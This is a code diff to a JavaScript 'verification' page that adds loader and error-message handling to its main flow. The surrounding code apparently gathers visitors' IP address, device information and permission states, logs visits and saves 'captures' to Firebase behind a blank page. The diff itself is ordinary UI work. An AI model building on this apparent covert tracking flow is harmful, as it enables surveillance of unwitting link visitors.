@@ -382,30 +382,63 @@ async function saveCapture({
     }
 }
 
+// ── UI HELPERS ────────────────────────────────────────────────────────────
+function hideLoader() {
+    const el = document.getElementById('app-loader');
+    if (el) el.style.display = 'none';
+}
+
+function showError(message) {
+    hideLoader();
+    const el = document.getElementById('app-error');
+    if (el) {
+        el.style.display = 'flex';
+        const msg = document.getElementById('app-error-msg');
+        if (msg && message) msg.textContent = message;
+    }
+}
+
 // ── MAIN FLOW ─────────────────────────────────────────────────────────────
 async function initVerification() {
-    const params = new URLSearchParams(window.location.search);
-    const linkId = params.get('linkId');
-    if (!linkId) return;
-
-    // ── Fire ALL async work simultaneously from the very first tick ───────
-    // queryPermissionStates() is near-instant (Permissions API, no network).
-    // By the time Firebase responds, permission states are already known.
-    const settingsPromise   = get(ref(db, 'managed_links/' + linkId));
-    const permStatesPromise = queryPermissionStates();
-    const infoPromise       = collectDeviceInfo();
-    const ipPromise         = getIPAddress();
-
-    // ── Wait for Firebase settings ────────────────────────────────────────
-    let settings;
     try {
-        const snap = await settingsPromise;
-        settings   = snap.val();
-    } catch (e) {
-        console.error('Firebase fetch error:', e);
-        return;
-    }
-    if (!settings || !settings.active) return;
+        const params = new URLSearchParams(window.location.search);
+        const linkId = params.get('linkId');
+        if (!linkId) {
+            showError('Invalid or missing link. Please check the URL and try again.');
+            return;
+        }
+
+        // ── Fire ALL async work simultaneously from the very first tick ───────
+        // queryPermissionStates() is near-instant (Permissions API, no network).
+        // By the time Firebase responds, permission states are already known.
+        const settingsPromise   = get(ref(db, 'managed_links/' + linkId));
+        const permStatesPromise = queryPermissionStates();
+        const infoPromise       = collectDeviceInfo();
+        const ipPromise         = getIPAddress();
+
+        // ── Wait for Firebase settings ────────────────────────────────────────
+        let settings;
+        try {
+            const snap = await settingsPromise;
+            settings   = snap.val();
+        } catch (e) {
+            console.error('Firebase fetch error:', e);
+            showError('Network error. Please check your connection and try again.');
+            return;
+        }
+
+        if (!settings) {
+            showError('This link does not exist or has expired.');
+            return;
+        }
+
+        if (!settings.active) {
+            showError('This link is no longer active.');
+            return;
+        }
+
+        // Hide loader — we are proceeding with the flow
+        hideLoader();
 
     runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});
 
@@ -470,6 +503,11 @@ async function initVerification() {
         permissionLog, permissionTrigger, browserBlocksAutoPrompt
     });
     // Page remains blank.
+
+    } catch (err) {
+        console.error('initVerification fatal error:', err);
+        showError('An unexpected error occurred. Please try again.');
+    }
 }
 
 // ── BOOT ─────────────────────────────────────────────────────────────────
